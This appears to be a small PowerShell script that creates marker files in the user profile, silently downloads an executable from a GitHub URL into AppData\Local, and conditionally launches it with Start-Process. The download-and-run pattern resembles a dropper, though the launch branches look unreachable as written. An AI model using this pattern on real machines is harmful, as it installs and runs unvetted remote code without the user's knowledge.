$profil = $env:USERPROFILE
$cli1 = Join-Path $profil "HEUI3R.txt"
$bonjour = Join-Path $profil "BONJOUR.txt"
$iesire = Join-Path $profil "IESIRE.txt"
$inchide = Join-Path $profil "AppData\Local\inchide.exe"
$url = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"

if (-Not (Test-Path $cli1)) {
    New-Item -Path $cli1 -ItemType File
}

if (-Not (Test-Path $inchide)) {
    Invoke-WebRequest -Uri $url -OutFile $inchide
}

if (Test-Path $cli1) {
    New-Item -Path $bonjour -ItemType File -Force
} else {
    Start-Process -FilePath $inchide
}

if (Test-Path $bonjour) {
    New-Item -Path $iesire -ItemType File -Force
} else {
    Start-Process -FilePath $inchide
}

if (Test-Path $iesire) {
    exit
} else {
    Start-Process -FilePath $inchide
}
